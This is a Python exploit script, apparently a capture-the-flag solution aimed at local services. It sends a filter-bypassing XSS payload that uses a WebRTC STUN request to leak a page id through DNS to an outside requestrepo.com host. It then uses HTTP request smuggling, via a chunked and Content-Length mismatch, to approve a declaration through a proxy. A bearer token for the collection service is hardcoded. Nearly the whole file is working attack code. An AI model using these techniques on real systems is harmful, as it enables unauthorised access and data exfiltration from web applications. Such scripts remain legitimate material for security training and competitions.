from requestrepo import Requestrepo
import requests
import threading
import re

PROXY_URL = "http://127.0.0.1:50000/"
BOT_URL = "http://127.0.0.1:50001/"

client = Requestrepo(
    token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NDA5NzM2MzcsImV4cCI6MTc0MzY1MjAzNywic3ViZG9tYWluIjoic2s0cW96dzEifQ.4u5C2tnbF7Ri1TNxt9jIOFcD3mLanuKd6T18dhpovnY",
    host="requestrepo.com",
    port=443,
    protocol="https",
)


def approve_declaration():
    payload = (
        """<<<script>script>script>
const id = document.getElementById("id").innerText;
const pc = new RTCPeerConnection({
    iceServers: [{ urls: `stun:${id}."""
        + client.domain
        + """` }]
});
pc.createDataChannel("channel");
pc.createOffer().then(offer => pc.setLocalDescription(offer))
<</script>/script>"""
    )

    print("Sending bot request...")
    res = requests.post(
        BOT_URL,
        data={
            "description": payload,
            "item_name": "test",
            "value": "1",
            "category": "electronics",
        },
        timeout=20,
    )

    flag = re.search(r"SSM{.*}", res.text)
    if flag:
        print(f"Flag: {flag.group()}")
    else:
        print("No flag found.")


thread = threading.Thread(target=approve_declaration)
thread.start()

print("Waiting for declaration to approve...")
while True:
    req = client.get_request()
    uuid = req.name.split(".")[0]
    if len(uuid) > 1:
        break

print(f"UUID: {uuid}")

data = "status=approved"
body = f"""0\r
\r
POST /declarations/{uuid}/status HTTP/1.1\r
Host: 127.0.0.1:8081\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(data)}\r
\r
{data}\r
\r
"""

headers = {
    "Host": "skibidi",
    "Content-Type": "text/plain",
    "Content-Length": str(len(body) - 4),
    "Transfer-Encoding": "chunked",
}

requests.post(
    PROXY_URL + "admin/123",
    headers=headers,
    cookies={"admin_key": "admin_key"},
    data=body,
    allow_redirects=False,
    timeout=10,
)
